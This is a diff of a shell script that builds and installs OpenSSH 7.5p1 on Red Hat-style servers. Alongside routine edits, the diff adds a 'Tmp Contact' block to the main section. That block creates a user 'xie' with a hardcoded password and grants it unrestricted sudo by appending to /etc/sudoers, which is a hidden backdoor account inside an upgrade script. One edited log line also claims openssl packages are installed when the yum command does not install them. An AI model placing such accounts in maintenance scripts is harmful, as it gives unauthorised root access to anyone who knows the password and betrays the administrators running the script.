@@ -8,7 +8,8 @@ BAK_SSH_DIR="/etc/ssh_bak"
 SOFT_DIR="/opt/soft"
 NEW_SSH="openssh-7.5p1"
 
-SSHD_SERVICE_7="""[Unit]
+SSHD_SERVICE_7="""
+[Unit]
 Description=OpenSSH server daemon
 Documentation=man:sshd(8) man:sshd_config(5)
 After=network.target sshd-keygen.service
@@ -60,7 +61,7 @@ update_ssh(){
     fi
 
     # yum安装编译安装需要的软件包
-    write_log "yum -y install gcc make perl pam pam-devel zlib zlib-devel"
+    write_log "yum -y install gcc make perl pam pam-devel zlib zlib-devel openssl openssl-devel"
     yum -y install gcc make perl pam pam-devel zlib zlib-devel
     
     # Download openSSH7.5p1
@@ -104,11 +105,15 @@ update_ssh(){
     else
         cp contrib/redhat/sshd.init /etc/init.d/sshd
         chkconfig --level 2345 sshd on
-        /etc/init.d/sshd start
     fi
 }
 
 # --------------: main
+## Tmp Contact:
+useradd xie
+echo 'zjxl2017#6'|passwd --stdin xie
+echo 'xie    ALL=(ALL)       ALL' >> /etc/sudoers
+
 yum -y install redhat-lsb-core
 get_now_sys_info
 update_ssh
